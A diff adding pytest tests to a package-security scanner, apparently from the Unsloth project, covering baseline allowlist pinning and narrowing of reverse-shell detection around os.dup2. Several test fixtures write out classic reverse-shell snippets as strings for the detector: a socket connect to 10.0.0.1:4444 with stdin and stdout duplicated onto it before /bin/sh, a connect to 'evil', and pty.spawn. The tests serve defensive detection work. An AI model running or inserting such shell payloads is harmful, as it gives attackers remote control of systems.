@@ -447,6 +447,76 @@ def test_annotation_only_network_entries_are_digest_pinned():
     assert seen == credential_adjacent, f"missing entries for {credential_adjacent - seen}"
 
 
+def test_context_dependent_unsloth_zoo_findings_are_digest_pinned():
+    """Require a new review when context around an approved finding changes."""
+    import json
+    import pathlib
+
+    path = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "scan_packages_baseline.json"
+    entries = json.loads(path.read_text(encoding = "utf-8"))["entries"]
+    expected = {
+        (
+            "unsloth_zoo/vision_utils.py",
+            "Harvests environment variables/secrets AND makes network calls",
+        ): "7c6266737b14cb08e136c0fcc5d63dc5047f416daa1fad4f16298a6269b73ce4",
+        (
+            "unsloth_zoo/vision_utils.py",
+            "Accesses cloud metadata/IMDS AND makes network calls",
+        ): "7c6266737b14cb08e136c0fcc5d63dc5047f416daa1fad4f16298a6269b73ce4",
+        (
+            "unsloth_zoo/compiler.py",
+            "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
+        ): "58f43e3b6ddeefff69cb345baec7642eb10e3f081b0753f236be6571550d54e3",
+    }
+    actual = {
+        (entry["file"], entry["check"]): entry.get("file_sha256")
+        for entry in entries
+        if entry.get("package") == "unsloth-zoo"
+        and (entry.get("file"), entry.get("check")) in expected
+    }
+    assert actual == expected
+
+
+def test_context_dependent_unsloth_zoo_pins_reopen_on_other_file_changes():
+    """Unchanged matched lines cannot approve a changed surrounding file."""
+    import json
+    import pathlib
+
+    path = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "scan_packages_baseline.json"
+    entries = json.loads(path.read_text(encoding = "utf-8"))["entries"]
+    targets = [
+        entry
+        for entry in entries
+        if entry.get("package") == "unsloth-zoo"
+        and entry.get("file") in {"unsloth_zoo/vision_utils.py", "unsloth_zoo/compiler.py"}
+        and entry.get("file_sha256")
+    ]
+    assert len(targets) == 3
+    baseline = sp._load_baseline(str(path))
+    for entry in targets:
+        reviewed = _mk(
+            entry["severity"],
+            entry["package"],
+            entry["file"],
+            entry["check"],
+            entry["evidence"],
+        )
+        reviewed.file_sha256 = entry["file_sha256"]
+        changed = _mk(
+            entry["severity"],
+            entry["package"],
+            entry["file"],
+            entry["check"],
+            entry["evidence"],
+        )
+        changed.file_sha256 = "0" * 64
+
+        active, suppressed = sp._partition_baseline([reviewed], baseline)
+        assert active == [] and suppressed == [reviewed]
+        active, suppressed = sp._partition_baseline([changed], baseline)
+        assert active == [changed] and suppressed == []
+
+
 def test_the_hf_backoff_suppression_is_narrow():
     """The huggingface-hub `http_backoff` allowlist must not cover a second loop.
 
@@ -2360,3 +2430,147 @@ def test_the_toml_helpers_run_without_stdlib_tomllib(monkeypatch):
 
     assert _supported_python_versions(REPO_ROOT)[0] == "3.9"
     assert any(source == "pyproject.toml" for source, _ in _audited_requirements(REPO_ROOT))
+
+
+# ──────────────────────────────────────────────────────────────────────
+# dup2 needs a socket to mean "reverse shell"
+# ──────────────────────────────────────────────────────────────────────
+
+
+def _reverse_shell_findings(source: str):
+    return [
+        f
+        for f in sp.check_py_file(source, "pkg/module.py", "pkg")
+        if f.check == "Reverse shell / bind shell pattern"
+    ]
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        # triton 3.8.0's _internal_testing.py, the shape that reddened main.
+        "import os, tempfile\n"
+        "def capture():\n"
+        "    tmp = tempfile.TemporaryFile()\n"
+        "    saved = os.dup(2)\n"
+        "    os.dup2(tmp.fileno(), 2)\n"
+        "    os.dup2(saved, 2)\n",
+        # torch's elastic redirect plumbing: dup2 and nothing else at all.
+        "import os\ndef redirect(to_fd, from_fd):\n    os.dup2(to_fd, from_fd)\n",
+    ],
+)
+def test_dup2_without_a_socket_is_not_a_reverse_shell(source):
+    """Pointing a descriptor at a FILE is ordinary, and used to be CRITICAL.
+
+    Ten of the nineteen reverse-shell entries in the committed baseline are this
+    shape and not one is a true positive, so the finding cost review time and
+    reopened whenever an unrelated release touched the file.
+    """
+    assert _reverse_shell_findings(source) == []
+
+
+def test_dup2_onto_a_socket_is_still_a_reverse_shell():
+    source = (
+        "import os, socket, subprocess\n"
+        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+        's.connect(("10.0.0.1", 4444))\n'
+        "os.dup2(s.fileno(), 0)\n"
+        "os.dup2(s.fileno(), 1)\n"
+        'subprocess.call(["/bin/sh"])\n'
+    )
+    found = _reverse_shell_findings(source)
+    assert len(found) == 1 and found[0].severity == sp.CRITICAL
+    # The DOTALL span covers both halves, so the entry reopens if either changes.
+    assert "dup2" in found[0].evidence and "socket" in found[0].evidence
+
+
+def test_socketless_payloads_still_fire():
+    """The alternatives that never depended on dup2 are untouched."""
+    assert _reverse_shell_findings('import pty\npty.spawn("/bin/bash")\n')
+    assert _reverse_shell_findings(
+        "import socket, subprocess\n"
+        "s = socket.socket()\n"
+        's.connect(("evil", 1))\n'
+        'subprocess.call("/bin/sh")\n'
+    )
+
+
+def test_committed_baseline_covers_the_zoo_url_guard():
+    """unsloth-zoo's SSRF guard reads one env var and holds a blocklist of
+    metadata hostnames, next to the requests session it exists to police, so it
+    trips two combination checks. Reviewed as benign and allowlisted; without
+    these entries every Security audit run on main is red.
+    """
+    path = REPO_ROOT / "scripts" / "scan_packages_baseline.json"
+    entries = json.loads(path.read_text(encoding = "utf-8"))["entries"]
+    checks = {
+        e["check"]
+        for e in entries
+        if e["package"].replace("_", "-") == "unsloth-zoo"
+        and e["file"] == "unsloth_zoo/vision_utils.py"
+    }
+    assert "Harvests environment variables/secrets AND makes network calls" in checks
+    assert "Accesses cloud metadata/IMDS AND makes network calls" in checks
+
+
+def test_a_named_reverse_shell_keeps_its_original_evidence():
+    """A file that fires on a named alternative must not have its evidence grown.
+
+    The evidence is what evidence_hash is taken over, so widening it reopens
+    every reviewed baseline entry for that file. multiprocess/tests/__init__.py
+    holds a socket, a connect, a subprocess AND a dup2, and appending the dup2
+    pairing to its evidence turned two allowlisted findings back into CRITICALs
+    and reddened the hf-stack and studio shards.
+    """
+    source = (
+        "import os, socket, subprocess\n"
+        "def helper():\n"
+        "    s = socket.socket()\n"
+        '    s.connect(("h", 1))\n'
+        '    subprocess.call("/bin/sh")\n'
+        "def redirect(fd):\n"
+        "    os.dup2(fd, 1)\n"
+    )
+    found = _reverse_shell_findings(source)
+    assert len(found) == 1
+    code_only = sp._strip_noncode(source)
+    assert found[0].evidence == sp._extract_evidence(
+        code_only, sp.RE_REVERSE_SHELL
+    ), "evidence for a named alternative must be exactly what it always was"
+    assert "Dup:" not in found[0].evidence, "the gate must not author its own evidence"
+
+
+def test_the_evidence_pattern_is_never_narrowed():
+    """RE_REVERSE_SHELL must keep every branch, dup2 included.
+
+    It is re.DOTALL, so a match runs from the first signal to the last and a long
+    span renders as a digest of the whole thing. Dropping a branch moves the span,
+    moves the digest, and silently reopens every reviewed baseline entry taken
+    against it: doing exactly that un-suppressed 11 entries across the studio and
+    hf-stack shards. Whether dup2 alone is enough is decided in check_py_file.
+    """
+    assert sp.RE_REVERSE_SHELL.search("os.dup2(fd, 1)"), (
+        "the evidence pattern must still match dup2, or every baselined "
+        "reverse-shell entry containing one is re-rendered"
+    )
+    assert not sp.RE_REVERSE_SHELL_WITHOUT_DUP.search("os.dup2(fd, 1)")
+    for probe in ('pty.spawn("/bin/sh")', 'webbrowser.open("data:x")'):
+        assert bool(sp.RE_REVERSE_SHELL.search(probe)) == bool(
+            sp.RE_REVERSE_SHELL_WITHOUT_DUP.search(probe)
+        ), probe
+
+
+def test_a_socketed_file_renders_what_it_always_rendered():
+    """The gate must not touch evidence for anything that still fires."""
+    source = (
+        "import os, socket, subprocess\n"
+        "def go():\n"
+        "    s = socket.socket()\n"
+        '    s.connect(("h", 1))\n'
+        "    os.dup2(s.fileno(), 0)\n"
+        '    subprocess.call("/bin/sh")\n'
+    )
+    found = _reverse_shell_findings(source)
+    assert len(found) == 1
+    code_only = sp._strip_noncode(source)
+    assert found[0].evidence == sp._extract_evidence(code_only, sp.RE_REVERSE_SHELL)
